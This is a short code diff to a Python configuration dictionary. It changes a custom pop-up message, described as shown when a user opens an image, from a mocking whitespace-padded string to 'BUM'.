@@ -28,12 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "
-        
-        
-        
-        
-                                                                    Yeaa your dumb😭", # Message to show
+        "message": "BUM", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
